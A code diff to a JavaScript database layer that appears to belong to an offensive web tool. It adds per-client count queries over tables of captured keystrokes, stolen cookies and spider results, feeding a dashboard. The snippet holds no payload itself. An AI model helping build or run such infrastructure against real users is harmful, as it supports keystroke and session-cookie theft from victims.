@@ -272,6 +272,17 @@ export function createDatabase(dbPath) {
     "DELETE FROM cookie_entries WHERE client_id = ?"
   );
 
+  // Prepared statements — hasData count queries
+  const spiderCountStmt = db.prepare(
+    "SELECT COUNT(*) as cnt FROM spider_results WHERE client_id = ?"
+  );
+  const keyloggerCountStmt = db.prepare(
+    "SELECT COUNT(*) as cnt FROM keylogger_entries WHERE client_id = ?"
+  );
+  const cookieCountStmt = db.prepare(
+    "SELECT COUNT(*) as cnt FROM cookie_entries WHERE client_id = ?"
+  );
+
   /**
    * Map a raw `links` row to the public link shape.
    * @param {object|undefined} row
@@ -679,6 +690,20 @@ export function createDatabase(dbPath) {
     /** Delete all cookie entries for a client. */
     clearCookieEntries(clientId) {
       deleteCookieEntriesByClientStmt.run(clientId);
+    },
+
+    /**
+     * Returns a summary of which DB-backed payload tables have data for a client.
+     * Used to show historical data indicator dots in the dashboard.
+     * @param {string} clientId
+     * @returns {{ spider: boolean; keylogger: boolean; cookies: boolean }}
+     */
+    getClientHasData(clientId) {
+      return {
+        spider: spiderCountStmt.get(clientId).cnt > 0,
+        keylogger: keyloggerCountStmt.get(clientId).cnt > 0,
+        cookies: cookieCountStmt.get(clientId).cnt > 0,
+      };
     },
 
     /** Close the database connection. */
